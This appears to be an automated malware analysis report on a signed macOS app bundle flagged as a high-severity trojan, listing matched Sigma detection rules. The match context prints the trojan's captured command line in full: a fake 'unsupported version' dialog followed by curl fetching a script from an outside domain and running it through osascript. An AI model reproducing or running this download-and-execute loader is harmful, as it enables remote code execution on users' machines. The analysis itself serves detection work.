attributes.magic: Zip archive data, at least v2.0 to extract, compression method=store

signature_info.signers: TANGENT TECHNOLOGIES PRIVATE LIMITED; Apple Inc.; Apple Inc.
signature_info.Format: app bundle with Mach-O universal (x86_64 arm64)

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

sigma_analysis_results.rule_description: Detects execution of AppleScript of the macOS scripting language AppleScript.

match_context.values: @{CommandLine=/usr/bin/osascript osascript -e display dialog 'This app does not support this version.' buttons {'OK'} default button 'OK' with icon stop; Image=/usr/bin/osascript; EventID=1}

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine
sigma_analysis_results.rule_author: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger

match_context.values: @{CommandLine=sh -c (osascript -e 'display dialog 'This app does not support this version.' buttons {'OK'} default button 'OK' with icon stop' || true) && (shell=$(curl -L -k 'https://support.docsend.site/519529/check')  osascript -e 'do shell script $shell'); Image=sh; EventID=1}

@{CommandLine=/bin/bash sh -c (osascript -e 'display dialog 'This app does not support this version.' buttons {'OK'} default button 'OK' with icon stop' || true) && (shell=$(curl -L -k 'https://support.docsend.site/519529/check')  osascript -e 'do shell script $shell'); Image=/bin/bash; EventID=1}
